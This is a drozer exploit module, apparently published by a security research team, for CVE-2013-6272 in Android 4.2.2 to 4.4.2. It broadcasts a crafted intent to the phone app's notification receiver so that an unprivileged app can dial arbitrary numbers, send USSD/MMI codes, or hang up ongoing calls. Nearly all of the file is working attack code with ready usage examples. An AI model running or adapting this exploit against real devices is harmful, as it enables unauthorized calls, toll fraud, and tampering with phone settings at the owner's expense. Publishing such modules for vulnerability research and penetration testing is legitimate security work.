"""
CVE-2013-6272

http://www.curesec.com
by Curesec Research Team security@curesec.com

Tested to be VULN:
4.2.2
4.3
4.4.2

Tested NOT VULN:
4.0.3
4.1.1
4.1.2
"""

from drozer import android
from drozer.modules import common, Module

#comment in to start ipython
#from IPython import embed



class callme1(Module):

    name = "Exploit CVE-2013-6272 abuse PhoneGlobalsNotificationBroadcastReceiver"
    description = "This plugin abuses a bug which allows a malicious app/user to use the com.android.phone without the necessary permissions."
    examples = "run curesec.exploit.callme -t 1234567890\nrun curesec.exploit.callme -c *%2343%23\nrun curesec.exploit.callme -k\n\n"
    author = "security@curesec.com"
    date = "2014-6-25"
    license = "BSD (3-clause)"
    path = ["curesec", "exploit"]

    def add_arguments(self, parser):
        parser.add_argument("-t", "--telephone",  default=None, help="specify the number to call")
        parser.add_argument("-c", "--code", default=None, help="USSD/MMI code, Attention! Use %23 for encoded #")
        parser.add_argument("-k", "--kill", action="store_true",default=None, help="Kill/Hangup ongoin call")

    def usagecallme(self):
       self.stderr.write("Name: Exploit CVE-2013-6272 abuse PhoneGlobalsNotificationBroadcastReceiver\n")
       self.stderr.write("Desc: This plugin abuses a bug which allows a malicious app/user to use the com.android.phone without the necessary permissions.\n")
       self.stderr.write("Author: security@curesec.com\n")
       self.stderr.write("Examples:\nrun curesec.exploit.callme1 -t 1234567890\nrun curesec.exploit.callme1 -c *%2343%23\nrun curesec.exploit.callme1 -k\n\n")


    def execute(self, arguments):

        if arguments.code != None and arguments.telephone != None and arguments.kill!= None:
            self.usagecallme()
            self.stderr.write("Please specify only -t, -c or -k not all\n")
            return 

        if arguments.code == None and arguments.telephone == None and arguments.kill == None:
            self.usagecallme()
            self.stderr.write("Please specify -t, -c or -k\n")
            return

        self.stdout.write("[+] Exploiting CVE-2013-6272\n")

        if arguments.telephone != None:
            #set action as CALL
            act = "com.android.phone.ACTION_CALL_BACK_FROM_NOTIFICATION"

            #add the prefix
            data = "tel:%s" % arguments.telephone
            self.stdout.write("[+] Dialing: %s\n" % arguments.telephone)

        elif arguments.code != None:
            #set action as CALL
            act = "com.android.phone.ACTION_CALL_BACK_FROM_NOTIFICATION"

            #add the prefix
            data = "tel:%s" % arguments.code
            self.stdout.write("[+] Sending code: %s\n" % arguments.code)

        elif arguments.kill == True:
            act = "com.android.phone.ACTION_HANG_UP_ONGOING_CALL"
            data = None
            self.stdout.write("[+] Killing ongoing call\n")

        else:
            self.stdout.write("[-] Something went wrong.\n")
            return


        #build the intent
        intent = android.Intent(action=act, data_uri=data, component=['com.android.phone','com.android.phone.PhoneGlobals$NotificationBroadcastReceiver'])

        #debug, comment in to use ipython
        #embed()
        if intent.isValid():
            self.getContext().sendBroadcast(intent.buildIn(self))
        else:
            self.stderr.write("[-] Invalid!\n")
